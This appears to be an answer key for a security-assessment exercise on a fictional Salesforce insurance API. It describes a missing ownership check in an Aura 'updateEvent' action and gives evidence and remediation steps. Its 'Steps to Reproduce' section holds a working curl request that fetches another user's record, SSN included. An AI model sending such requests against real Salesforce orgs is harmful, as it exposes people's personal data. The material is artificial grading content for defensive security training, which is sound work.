# Expected Response

## System
- **Domain:** Insurance / Underwriting (Salesforce-Integrated)
- **System:** ClaimsFlow Underwriting API (Salesforce-Integrated)
- **Example ID:** SF-0012

## Priority Findings

### Finding 1: Insurance Salesforce — Insecure Design via Client-Assumed Authority in Aura updateEvent Exposes Cross-Ownership Claims Event Data (Pattern 3.1)
**Severity:** High
**Category:** Insecure Design / Client-Assumed Authority (Salesforce Aura)

**Summary:**
Per §4.0 (RISK-SF-012/RISK-SF-013): The `EventController` Apex class is declared `without sharing`, meaning Salesforce sharing rules are not enforced. The SOQL query is missing an ownership check. Per §5.0 (Pattern 3.1 — client-assumed authority): the Aura `updateEvent` action trusts the client-supplied `eventId` as an authoritative identity claim without validating it against `UserInfo.getUserId()` server-side. An attacker submitted `c.EventController.updateEvent` with `eventId: "0015CC1"` (belonging to `OwnerId: "005VICTIM"`) and received `SensitiveData__c: "SSN: 000-86-8999"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"`. In Insurance / Underwriting, exposure of claims event records containing SSNs enables insurance fraud.

**Evidence from HAR:**
- Request: `POST https://7b9f5cc1.lightning.force.com/aura`
- Aura action descriptor: `c.EventController.updateEvent`
- `aura.token`: `undefined`
- Params: `eventId: "0015CC1"`, `fields: ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]`
- Response `SUCCESS`: `Id: "0015CC1"`, `Name: "Victim Event Record"`, `OwnerId: "005VICTIM"`, `InternalNotes__c: "CONFIDENTIAL: internal review notes"`, `SensitiveData__c: "SSN: 000-86-8999"`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-SF-012 | EventController declared `without sharing` |
| context.txt §4.0 | RISK-SF-013 | SOQL missing ownership check |
| context.txt §5.0 | Pattern 3.1 | Client-assumed authority — eventId trusted without validation |
| HAR request | params.eventId | 0015CC1 — victim insurance event ID |
| HAR response | SensitiveData__c | SSN: 000-86-8999 (PII) |

## Steps to Reproduce

### Step 1 — Aura eventId client-assumed authority insurance (HAR)
```bash
curl -s -X POST 'https://7b9f5cc1.lightning.force.com/aura' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"0015CC1","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```
**Vulnerable:** Returns victim insurance event record including `SSN: 000-86-8999`. **Secure:** FORBIDDEN.

## Remediation
1. Declare `EventController` as `with sharing`.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Never trust client-supplied event IDs as authoritative; validate against current user.
4. Validate `aura.token`; server-side field allowlist.
